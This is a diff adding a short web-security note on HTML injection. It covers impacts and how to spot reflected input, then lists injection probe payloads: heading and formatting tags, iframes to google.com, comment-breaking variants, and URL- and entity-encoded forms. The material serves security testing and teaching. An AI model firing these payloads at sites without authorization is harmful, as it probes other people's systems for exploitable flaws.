@@ -1,0 +1,61 @@
+html injection:
+HTML injection is type of injection issue that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page.
+
+# Impact of HTML Injection
+
+1. it can allow attacker to modify the page.
+2. DOM can be load there.
+3. attackers can perform XSS.
+4. steal user’s credential.
+
+
+**location:** user-supplied input 
+How to find HTML Injection: 
+
+
+detect:
+
+- Find a input parameter either Get Based or Post Based
+- If your input Reflect Back to you on web page there may be HTML injection
+- Execute any HTML Code, if you successed to execute any HTML code there. then there is HTML injection
+
+To check input reflected or not
+
+- find input and write: hello world if it reflect then use payload
+- payload: <h1>helloworld</h1>
+
+->exploitation of HTML Injection
+
+payload: 
+
+<h1>html</h1>
+<h2>HTML1</h2>
+<h3>HTML2</h3>
+<h4>HTML3</h4>
+<h5>HTML4</h5>
+<h6>HTML5</h6>
+<pre>HTML</pre>
+<p>HTML</p>
+<i>HTML</i>
+<a href="https://www.google.com">HTML</a>
+<abbr title="HTML">HTML</abbr>
+<acronym title="Armour Infosec">AI</acronym>
+<address>address,address</address>
+<article><h2>Armour Infosec</h2></article>
+<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
+<b>HTML</b>
+<h1>HTML</h1><!--
+qq<h1>HTML</h1>
+qq<h1>HTML</h1>qq
+$$\<u>HTML</u>{}$$
+%3Ch1%3EHTML%3C%2Fh1%3E
+&lt;h1&gt;HTML&lt;/h1&gt;
+&#60;h1&#62;HTML&#60;/h1&#62;
+<iframe src="https://www.google.com" title="test"></iframe>
+123<h1>HTML</h1>
+<h1>HTML</h1>123
+123<h1>HTML</h1>123
+%253Ch1%253EHTML%253C%252Fh1%253E
+<iframe id="if1" src="https://www.google.com"></iframe>
+<iframe id="if2" src="https://www.google.com"></iframe>
+<A HREF=”http://bing.com/”>testing page</A>
